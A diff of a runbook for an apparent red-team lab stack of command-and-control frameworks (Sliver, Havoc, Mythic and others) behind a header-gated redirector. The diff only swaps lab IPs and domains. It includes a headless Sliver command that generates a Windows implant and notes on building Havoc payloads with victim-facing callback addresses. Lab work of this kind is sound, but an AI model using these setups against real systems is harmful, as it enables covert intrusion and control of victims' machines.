@@ -186,7 +186,7 @@ images and the named volumes were intact. Re-verified after boot:
 | Sliver | daemon up, `:80` bound (`0050`), `cadre` operator config present |
 | Havoc | profile parsed, `Started "c2stack - http" listener: http://0.0.0.0:80`, `payloads/Demon/src` + `*.bin` present, compilers resolved |
 | Adaptix | `The AdaptixC2 server is ready`, extenders + toolchain present |
-| Meridian | HTTP :8080 + DNS :5353/udp bound; DNS TXT `ping.c2.cadre.local` → `pong` through the published host port 15353 |
+| Meridian | HTTP :8080 + DNS :5353/udp bound; DNS TXT `ping.c2.lab.local` → `pong` through the published host port 15353 |
 | Mythic DB | `c2profile` = `1 http t`, `payloadtype` = `1 apollo t`, 81 commands, `c2stack-http` instance intact, last 2 payload builds `success` |
 | Portal | `/api/status` → all six services `port_live: true` |
 
@@ -206,10 +206,10 @@ images and the named volumes were intact. Re-verified after boot:
   RootPath `/cloud/storage/objects`) — verified live: with-header requests hit the
   listener, decoy without header. Full garble `generate` proven on v1.7.7 (47s build);
   headless generation works: `sliver-client console --rc gen.rc` where the rc file
-  contains `generate --http 192.168.77.1:80 --os windows --arch amd64 --name X` + `exit`.
+  contains `generate --http 192.168.100.1:80 --os windows --arch amd64 --name X` + `exit`.
 - **Havoc** — v0.7 teamserver with the C2Stack HTTP listener baked into the profile
   (`Docker/havoc/havoc.yaotl`): bind :80, Uris `/edge/cache/assets/`,
-  header `X-Request-ID: cadre-c2`, Hosts `192.168.77.1` (the redirector). Live-verified
+  header `X-Request-ID: cadre-c2`, Hosts `192.168.100.1` (the redirector). Live-verified
   through the redirector. Demon payloads are compiled SERVER-SIDE by the teamserver —
   the image now ships `payloads/Demon` (sources) + `payloads/DllLdr.x64.bin` +
   `Shellcode.x64/x86.bin` and the musl cross-gcc/nasm toolchains (this was a real gap:
@@ -236,9 +236,9 @@ images and the named volumes were intact. Re-verified after boot:
 
 ### Operator (Kali VM) next steps
 
-- Callback endpoint: `http://<host-ip-on-vmnet2>:<REDIRECTOR_HTTP_PORT>` with header
+- Callback endpoint: `http://<redirector-host>:<REDIRECTOR_HTTP_PORT>` with header
   `X-Request-ID: cadre-c2`.
-- Mythic REST: `http://<host-ip-on-vmnet2>:7443` (JWT via `POST /auth`, webhooks under
+- Mythic REST: `http://<redirector-host>:7443` (JWT via `POST /auth`, webhooks under
   `/api/v1.4`) — enable `--profile mythic`.
 - Sliver operator: connect `sliver-client` to `<host-ip>:31337` with the operator config
   minted at container start (name `cadre`: `docker exec c2stack-sliver-1 sh -c "sliver-server
@@ -263,7 +263,7 @@ the rest are created from the operator consoles:
   headers, so the redirector matches this route on path alone
   (`SLIVER_HEADER_GATE=off`).
 - **Havoc** — automatic: `Docker/havoc/havoc.yaotl` (baked into the image at build)
-  starts an HTTP listener on port `80` with `Hosts = ["192.168.77.1"]` (the C2Stack
+  starts an HTTP listener on port `80` with `Hosts = ["192.168.100.1"]` (the C2Stack
   redirector, so generated Demons phone home correctly out of the box). If the lab
   redirector host differs, edit Hosts in the Qt client (Listeners → c2stack - http)
   or in the profile + rebuild. Base path `/edge/cache/assets` + header come from the
@@ -275,12 +275,12 @@ the rest are created from the operator consoles:
 
 | Variable | Default | Used for |
 |---|---|---|
-| `VICTIM_REDIRECTOR_IP` | `192.168.77.1` | Victim-facing redirector IP baked into portal stagers + payload callbacks |
+| `VICTIM_REDIRECTOR_IP` | `192.168.100.1` | Victim-facing redirector IP baked into portal stagers + payload callbacks |
 | `REDIRECTOR_HTTP_PORT` | `80` | Published redirector port |
 | `C2_HEADER_NAME` / `C2_HEADER_VALUE` | `X-Request-ID` / `cadre-c2` | Redirector gate header (+ Meridian backend gate) |
 | `MERIDIAN_REQUIRE_HEADER_NAME/VALUE` | (same as C2 header) | Meridian backend header gate (unset = disabled) |
 | `SLIVER_HEADER_GATE` | `off` | `off` = path-only match (required: Sliver sends no headers) |
-| `MERIDIAN_DNS_DOMAIN` / `MERIDIAN_DNS_PORT` | `c2.cadre.local` / `15353` | DNS listener domain + host UDP port |
+| `MERIDIAN_DNS_DOMAIN` / `MERIDIAN_DNS_PORT` | `c2.lab.local` / `15353` | DNS listener domain + host UDP port |
 | `*_URI_PREFIX` | (per-framework paths) | Redirector route prefixes; must match agent configs exactly |
 - **Mythic** — the `http` C2 profile container is registered and the listener is live
   inside `mythic_http` (:80). Create the profile instance via the REST API:
@@ -305,7 +305,7 @@ the rest are created from the operator consoles:
   The DNS, SMB, and TCP listeners operate out-of-band (not through the redirector).
 - **Meridian** — the HTTP listener binds port `8080` on `c2_core`; it accepts both the
   plain API paths and the redirector's `/gateway/v1/telemetry` prefixed path. The DNS
-  listener listens on `0.0.0.0:5353/udp` inside the container (domain `c2.cadre.local`);
+  listener listens on `0.0.0.0:5353/udp` inside the container (domain `c2.lab.local`);
   the host-facing UDP port is `MERIDIAN_DNS_PORT` (default `15353` — Windows mDNS
   occupies 5353).
 
